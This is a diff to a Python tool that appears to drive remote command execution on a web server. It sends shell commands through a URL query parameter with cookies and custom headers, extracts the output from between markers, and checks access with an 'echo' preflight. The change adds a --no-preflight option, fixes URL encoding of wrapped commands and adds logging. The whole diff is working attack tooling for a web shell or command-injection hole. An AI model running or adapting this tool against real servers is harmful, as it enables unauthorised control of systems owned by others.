@@ -24,22 +24,6 @@ def voutput(message):
 
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-
-def preflight_request():
-    # Send request
-    preflight_random = random_string(16)
-    preflight_echo = f"echo {preflight_random}"
-    
-    if url_encode:
-        preflight_echo = urllib.parse.quote(preflight_echo)
-    
-    preflight_response = requests.get(f"{address}?{parameter}={preflight_echo}", cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
-    
-    # Validate response
-    if preflight_response.status_code == 200 and preflight_random in preflight_response.text:
-        return True, ''
-    else:
-        return False, f"Preflight request failed with status code: {preflight_response.status_code} and response: {preflight_response.text}"
     
     
 def extract_markers(response_text, start_marker, end_marker):
@@ -62,28 +46,43 @@ def send_command(command):
         wrapped_command = f"{wrapped_command}{suffix}"
     
     if url_encode:
-        command = urllib.parse.quote(command)
+        wrapped_command = urllib.parse.quote(wrapped_command)
     
     url = f"{address}?{parameter}={wrapped_command}"
-    voutput(f"Sending command: {url}")
+    voutput(f"Sent command: {url}")
     response = requests.get(url, cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
+    voutput(f"Status code: {response.status_code}")
+    voutput(f"Response size: {len(response.text)}")
     
     if response.status_code != 200:
-        print(f"Command execution failed with status code: {response.status_code} and response: {response.text}")
+        print(f"[!] Command execution failed with status code: {response.status_code} and response: {response.text}")
         return None
     
     unescaped_response = unescape(response.text)
     return extract_markers(unescaped_response, start_marker, end_marker)
 
 
+def preflight_request():
+    preflight_random = random_string(16)
+    preflight_echo = f"echo {preflight_random}"
+    
+    response = send_command(preflight_echo)
+    if not response:
+        print("[!] Preflight request failed: No response received.")
+        return False
+    if preflight_random not in response:
+        print("[!] Preflight request failed: Could not verify command output.")
+        return False
+    return True
+
 
 def main():
-    is_successful, error_message = preflight_request()
-    if is_successful:
-        print("Connection successful!")
+    if not skip_preflight:
+        is_successful = preflight_request()
+        if is_successful:
+            print("Connection successful!")
     else:
-        print(f"Connection failed: {error_message}")
-        return
+        print("Skipping preflight checks.")
     
     host_name = urllib.parse.urlparse(address).netloc
 
@@ -113,6 +112,7 @@ if __name__ == "__main__":
 
     parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
     parser.add_argument("--no-url-encode", action="store_true", help="Disable URL encoding of commands")
+    parser.add_argument("--no-preflight", action="store_true", help="Skip preflight checks and go straight to the shell interface")
 
     args = parser.parse_args()
 
@@ -124,5 +124,6 @@ if __name__ == "__main__":
     user_agent = args.agent
     prefix = args.prefix
     suffix = args.suffix
+    skip_preflight = args.no_preflight
     
     main()
